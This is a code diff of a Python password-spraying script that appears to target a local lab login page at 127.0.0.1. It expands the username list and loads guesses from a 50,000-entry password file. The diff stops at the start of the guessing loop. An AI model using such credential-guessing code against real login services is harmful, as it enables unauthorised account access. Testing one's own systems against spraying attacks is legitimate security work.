@@ -1,24 +1,37 @@
 import requests
+import json
+import os
 
 LOGIN_URL = "http://127.0.0.1:8000/login"
 
 usernames = [
-    "easy1",
-    "easy2",
-    "medium1",
-    "strong1",
-    "strong2"
+    "user1",
+    "user2",
+    "John",
+    "charlie",
+    "oliver",
+    "nina",
+    "bruce",
+    "derek",
+    "elena", 
+    "linda"
+
 ]
 
-passwords = [
-    "123456",
-    "password",
-    "Welcome123"
-]
+PASSWORDS_FILE = "passwords_50k.json"
 
+def load_passwords():
+   
+    if not os.path.exists(PASSWORDS_FILE):
+        print(f"[ERROR]  {PASSWORDS_FILE} ")
+        return []
+    
+    with open(PASSWORDS_FILE, "r", encoding="utf-8") as f:
+        return json.load(f)
 
 def password_spraying():
     session = requests.Session()
+    passwords = load_passwords()
     count_try =0
     for password in passwords:
         for username in usernames:
